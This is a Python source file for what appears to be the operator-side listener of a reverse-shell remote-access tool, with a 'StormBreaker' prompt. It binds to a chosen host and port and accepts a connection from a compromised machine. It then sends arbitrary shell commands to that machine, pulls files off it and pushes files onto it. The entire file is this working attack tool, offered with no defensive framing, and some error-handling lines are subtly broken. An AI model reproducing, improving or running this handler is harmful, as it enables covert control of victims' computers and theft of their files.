import socket
import os


def upload_file(s, filename):
    try:
        size = os.stat(filename).st_size
        if int(size) < 10000000:
            with open(filename, "rb") as f:
                data = f.read()
                s.sendall(data)
                print("[+] File Uploaded Succesfully!")
        else:
            s.sendall("ERROR")
            print("TOO LARGE")
    except FileNotFoundError:
        s.sendall("ERROR")
        print("[-] File not Found!")
    except:
        s.sendall("ERROR")
        print("[-] Something went wrong!")


def download_file(s, filename):
    file_bytes = s.recv(10000000)
    try:
        if file_bytes.decode() == "ERROR":
            print("[-] An Error Occurred!\n  Check the file name or the file is too large to download.")
            return
    except:
        print("[-] An Error Occurred!\n  Check the file name or the file is too large to download.")
        return

    print("[*] Downloading File...")
    with open(filename, "wb") as f:
        f.write(file_bytes)
    print("[+] Download Finished!")


def listener():
    lhost = input("\n      [*] Enter LHOST: ")
    lport = int(input("      [*] Enter LPORT: "))
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.bind((lhost, lport))
    except:
        print("\n      [-] Invalid IP Adress!\n")
    else:
        print("      [*] Listening for Conections...")
        s.listen()
        conn, addr = s.accept()
        print(f"\n      [+] Connected to {addr[0]}\n")

        while True:
            try:
                command = input(f"<<StormBreaker@{addr[0]}>> ")
                if command != "":
                    if command == 'clear':
                        os.system('clear')
                    elif command[:8] == 'download':
                        conn.send(command.encode())
                        download_file(conn, command[9:])
                    elif command[:6] == 'upload':
                        conn.send(f"upload {command[7:]}".encode())
                        upload_file(conn, command[7:])
                    elif command != "quit":
                        conn.send(command.encode())
                        recieved_data = conn.recv(5000).decode()
                        print(recieved_data)
                    else:
                        conn.close()
                        print("\n[-] Connection Closed!\n")
                        break
                else:
                    pass
            except KeyboardInterrupt:
                conn.close()
                break